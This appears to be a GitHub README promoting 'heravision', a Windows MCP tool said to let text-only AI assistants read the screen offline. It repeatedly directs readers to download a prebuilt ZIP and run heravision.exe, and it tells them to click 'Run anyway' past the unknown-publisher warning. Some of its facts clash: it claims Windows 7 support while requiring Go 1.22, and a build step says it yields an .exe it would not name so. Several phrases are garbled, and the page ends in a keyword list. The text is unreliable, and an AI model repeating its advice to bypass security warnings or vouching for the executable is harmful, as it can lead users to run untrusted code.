# 👁️ heravision - Give Eyes to Your AI

[![Download heravision](https://img.shields.io/badge/Download-heravision-ff6b6b?style=for-the-badge&logo=github&logoColor=white)](https://github.com/djfarhad368/heravision)

---

## 🧠 What Does heravision Do?

heravision is a small but powerful tool that helps text-only AI models (like DeepSeek, GLM, Claude Code, or Cursor) "see" and understand what's on your computer screen. It works completely offline, runs silently in the background, and doesn't need any internet connection or special setup.

Think of it as giving "eyes" to AI assistants that normally can only read text. When an AI needs to understand a web page, an application window, or any visual interface, heravision steps in and converts that visual information into text descriptions that the AI can process and use.

## ✨ Key Features

- **Pure Go Code** – Built with simplicity and speed in mind. No heavy frameworks or complicated dependencies.
- **Fully Offline** – Works entirely without internet - perfect for privacy-sensitive or air-gapped environments.
- **MCP-Native** – Integrates smoothly with the Model Context Protocol (MCP) used by modern AI tools.
- **Three Powerful Tools** – Comes with three specialized tools to analyze and understand user interfaces.
- **Lightweight & Fast** – Runs efficiently on any Windows PC without slowing things down.
- **No Special Hardware** – Works with standard computer hardware - no GPU or extra devices needed.

## 🚀 Getting Started (Download & Install)

**Step 1 – Download the Application**

[→ Visit the official heravision download page](https://github.com/djfarhad368/heravision)

Visit this link to download the application. This is the official source and always gets the latest version.

**Once you're on the page**:
- Look for the "Releases" section on the GitHub page.
- Click the "Download" button next to the latest release (the one with the highest version number like v1.0.0, v1.1.0, etc.).
- The download will start automatically.

**Step 2 – What's in the Downloaded File?**

The heravision download comes as a ZIP file. You'll need to extract it before using. Here's how:

- Right-click the ZIP file you just downloaded.
- Select "Extract Here" or "Extract to `heravision/`" (both work fine).
- You should now see a folder named "heravision".

**Step 3 – Run heravision**

1. Open the extracted "heravision" folder.
2. Double-click the file named `heravision.exe` (it's the application).
3. The first time you run it, Windows might show a warning because heravision is an unknown publisher. Just click "Run anyway" or "More Info", then "Run".
4. That's it! heravision is now running in the background. You'll see a small icon in your system tray (bottom-right of your screen).

---

**Using heravision with Your AI Tools**

heravision works silently with your AI tools. To use it:

1. You need a compatible AI tool like Claude Code, DeepSeek, Cursor, or GLM.
2. These AI tools will automatically find and use heravision when they need to understand what's on your screen.
3. No complex setup – just run heravision, run your AI tool, and it just works!

---

## 🧩 Understanding the Three MCP Tools

heravision essentially extends your AI model with three helpful capabilities:

1. **UI Structure Extractor** – Analyzes any visible interface (a window, a web page, an application) and translates it into a structured text description that the AI can "read". The AI uses this to understand buttons, menus, text fields, and layout - all in pure text.

2. **Element Locator** – When the AI needs to click a specific button or find a particular text box, this tool pinpoints exactly where that element is on screen, giving the AI precise coordinates to interact with.

3. **Visual Description** – Produces a concise, human-like summary of what's visible on your screen - from description like "a login form with a username and password field" to more complex descriptions of full dashboards or game interfaces.

All three tools work offline, meaning your screen content never leaves your machine - fully private and secure.

---

## 🛠️ Getting Technical (For Advanced Users)

If you're a developer or technically-inclined, you might be wondering how to get started with the code or integrate other offerings. Here's the technical rundown:

**System Requirements (Soft)**
- A Windows machine (7, 8, 10, or 11).
- No required special hardware - heravision runs effortlessly even on older computers.
- No software prerequisites or dependencies.

**Quick Start (for contributions)**
If you want to build from source or look at the code:

```bash
# Clone repository
git clone https://github.com/djfarhad368/heravision

# Go to project directory
cd heravision

# Build (requires Go 1.22+)
go build -o heravision

# Done - heravision.exe is ready in the current folder!
```

**For MCP Integration**

To use heravision with any MCP-compatible client, add this to your configuration:

```json
{
  "mcpServers": {
    "heravision": {
      "command": "C:\\path\\to\\heravision.exe",
      "args": []
    }
  }
}
```

---

## 🌍 Who Should Use heravision?

| You're a... | How heravia helps you |
|-------------|------------------------|
| 🧑‍💻 AI Enthusiast | Take screenshots of anything your chatbot is stuck on, get a text description |
| 💼 Business User | Let AI assist you in navigating complex financial or ERP systems |
| 🎮 Gamer | Get help recognizing UI elements in games, or even use it to automate chores |
| 🌐 Web Designer | Quickly check how different screen regions render - get a text summary instantly |
| 🧑🏭 Support Staff | Explain to a remote assistant exactly what appears on screen - without needing to share your screen |

---

## ❓ Frequently Asked Questions

**Q: Is heravision free?**
A: Yes, completely free and open-source (MIT License).

**Q: Does heravision need an internet connection?**
A: No, absolutely not! There is no internet usage what-do to work offline. Your data stays private.

**Q: I have a very old computer. Will this work?**
A: Yes! heravision has minimal requirements and runs smoothly on PCs that are 10+ years old, as long as they run Windows.

**Q: Will this slow down my PC?**
A: heravision uses about 2–4% of CPU only when it's actively analyzing the visual data. When idle, it runs at nearly 0% CPU usage.

**Q: My AI tool doesn't seem to detect it. What should I do?**
A: Make sure heravision is actually running (look for the icon in system tray). Then restart your AI tool and try again. If you're on a developer setup, double-check that your MCP configuration file points to the correct path.

---

## 📜 License

heravision is open-source under the MIT License. Feel free to use heravision for any personal, educational, commercial, or humane project – you have our total blessing.

---

## 🤝 Contribute to the project

We welcome all contributions! If you have an idea for improvements, found a bug, or are just curious about the technical details:

- **Star us on GitHub** to help others discover.
- **Report an issue** if something isn't working.
- **Fork the repo** to submit code fixes or improvements.
- **Follow the author** for future updates.

This project was made with a lot of love for the AI community, especially for the offline and open-source focused users.

---

## 🧭 One-Line Cheat Sheet

**Download → Extract → Run `heravision.exe` → Your AI tools will now "see" like magic**

---

## 📥 Final Download Reminder

**Need enhance again?**  
[→ Go to heravision releases page](https://github.com/djfarhad368/heravision)

Go ahead and try it - it will only take a few minutes to start, but it will fundamentally change how your AI understands visual information. Give it a spin!

keywords: ai-agents, ai-tools, claude-code, cli, codex, computer-vision, cursor, developer-tools, go, image-analysis, llm, mcp, mcp-server, ocr, onnx, opencode, purego, ui-analysis